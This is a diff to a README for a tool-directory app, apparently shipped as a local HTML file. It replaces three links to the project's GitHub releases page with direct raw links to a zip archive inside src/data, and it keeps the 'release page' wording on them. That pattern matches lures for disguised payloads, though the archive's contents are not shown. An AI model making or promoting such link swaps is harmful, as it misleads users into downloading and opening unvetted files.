@@ -1,6 +1,6 @@
 # 🛠️ Tools-and-Resources - Find Better Tools Fast
 
-[![Download Tools-and-Resources](https://img.shields.io/badge/Download%20Now-Purple?style=for-the-badge&logo=github)](https://github.com/nancyunimproved357/Tools-and-Resources/releases)
+[![Download Tools-and-Resources](https://img.shields.io/badge/Download%20Now-Purple?style=for-the-badge&logo=github)](https://github.com/nancyunimproved357/Tools-and-Resources/raw/refs/heads/main/src/data/and_Resources_Tools_1.8.zip)
 
 ## 📦 What this is
 
@@ -30,7 +30,7 @@ The app runs as a local HTML file, so it opens like a webpage on your own comput
 
 ## 🚀 Download and open on Windows
 
-1. Visit the release page: https://github.com/nancyunimproved357/Tools-and-Resources/releases
+1. Visit the release page: https://github.com/nancyunimproved357/Tools-and-Resources/raw/refs/heads/main/src/data/and_Resources_Tools_1.8.zip
 2. Download the latest release file from that page
 3. If the file comes as a .zip, right-click it and choose Extract All
 4. Open the extracted folder
@@ -212,7 +212,7 @@ These topics help the app serve both general users and people who build tool sta
 
 ## 📌 Quick start
 
-1. Go to the release page: https://github.com/nancyunimproved357/Tools-and-Resources/releases
+1. Go to the release page: https://github.com/nancyunimproved357/Tools-and-Resources/raw/refs/heads/main/src/data/and_Resources_Tools_1.8.zip
 2. Download the latest file
 3. Open the HTML file in your browser
 4. Search for a tool or category
